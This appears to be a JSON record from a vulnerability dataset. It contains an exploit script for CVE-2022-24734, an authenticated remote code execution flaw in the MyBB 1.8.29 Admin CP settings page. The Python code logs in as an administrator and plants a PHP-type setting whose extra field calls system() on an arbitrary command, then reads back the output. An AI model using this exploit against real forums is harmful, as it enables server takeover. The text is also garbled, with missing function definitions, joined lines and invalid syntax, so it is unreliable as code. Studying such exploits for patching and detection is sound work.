{
    "text": "vul_name : MyBB 1.8.29 MyBB 1.8.29 Remote Code Execution ( RCE )  ( Authenticated )  ， vul_cve : CVE-2022-24734 ， vul_poc :  # Exploit Title : MyBB 1.8.29 - Remote Code Execution ( RCE )  ( Authenticated )  ，  # Date : 2022-05-08 ，  # Exploit Author : Altelus ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : MyBB 1.8.29 ，  # Tested on : Linux ，  # CVE : CVE-2022-24734 ，  # An RCE can be obtained on MyBB's Admin CP in Configuration -> Add New Setting. ，  # The user must have a rights to add or update setting. This is tested on MyBB 1.8.29. ，  # The vulnerability may have existed as early as 1.4.0 since this ，  # 'php' checking is introduced in 1.4.0 (  ， from base64 import b64decode ， from bs4 import BeautifulSoup ， data = { ， \"username\" : username ,  ， \"password\" : password ,  ， \"do\" : \"login\" ， } ， login_txt = r_client.post ( host + \"/admin/index.php\" , data=data ) .text ， print ( \" [ - ] Login failure. Incorrect credentials supplied\" )  ， exit ( 0 )  ， print ( \" [ + ] Login successful ! \" )  ， config_settings_txt = r_client.get ( host + \"/admin/index.php?module=config-settings&action=add\" ) .text ， print ( \" [ - ] Supplied user doesn't have the rights to add a setting\" )  ， exit ( 0 )  ， print ( \" [  *  ] Adding a malicious settings.\" )  ， soup = BeautifulSoup ( config_settings_txt , \"lxml\" )  ， my_post_key = soup.find_all ( \"input\" , {\"name\" : \"my_post_key\"} )  [ 0 ]  [ 'value' ]  ， rand_string = get_rand_string (  )  ， extra = \"\\\" . system ( '{}' ) .\\\".format ( raw_cmd )  ， extra = \"\\\" . system ( '{} | base64 -w 0' ) .\\\".format ( cmd )  ， data = { ， \"my_post_key\" : my_post_key ,  ， \"title\" : \"An innocent setting\" ,  ， \"description\" : \"An innocent description\" ,  ， \"gid\" : 1 ,  ， \"disporder\" : \" ,  ， \"name\" : rand_string ,  ， \"type\" : \"\\tphp\" ,  ， \"extra\" : extra ,  ， \"value\" : \"An innocent value\" ， } ， post_setting = r_client.post ( host + \"/admin/index.php?module=config-settings&action=add\" , data=data , allow_redirects=False )  ， soup = BeautifulSoup ( post_setting.text , \"lxml\" )  ， error_txt = soup.find_all ( \"div\" , {\"class\" : \"error\"} )  [ 0 ] .text ， print ( \" [ - ] Exploit didn't work. Reason : '{}'\".format ( error_txt )  ， exit ( 0 )  ， print ( \" [ + ] Malicious post settings accepted ! \" )  ， conf_settings_list = r_client.get ( host + \"/admin/index.php?module=config-settings&action=change\" ) .text ， soup = BeautifulSoup ( conf_settings_list , \"lxml\" )  ， row_setting = soup.find_all ( \"tr\" , {\"id\" : \"row_setting_{}\".format ( ident_string ) } )  [ 0 ]  ， cmd_result = row_setting.find_all ( \"div\" , {\"class\" : \"form_row\"} )  [ 0 ] .text ， cmd_result = b64decode ( cmd_result [ 2 :  ]  ) .decode (  )  ， print ( \" [ + ] Result : {}\".format ( str ( cmd_result )  ， parser = argparse.ArgumentParser (  )  ， parser.add_argument ( '-username' , required=True , help=\"MyBB Admin CP username\" )  ， parser.add_argument ( '-password' , required=True , help=\"MyBB Admin CP password\" )  ， parser.add_argument ( '-host' , required=True , help=\"e.g. ， parser.add_argument ( '-cmd' , required=False , help=\"Command to run\" )  ， parser.add_argument ( '-raw_cmd' , required=False , help=\"Command to run directly into system (  ) \" )  ， args = parser.parse_args (  )  ， username = args.username ， password = args.password ， host = args.host ， cmd = \"id\" if args.cmd = None else args.cmd ， raw_cmd = \" if args.raw_cmd = None else args.raw_cmd ， r_client = requests.Session (  )  ， login ( username , password )  ， ident_string = add_settings ( cmd , raw_cmd=raw_cmd )  ， get_cmd_result ( ident_string , raw_cmd=raw_cmd ) ",
    "time": "2022.05.17"
}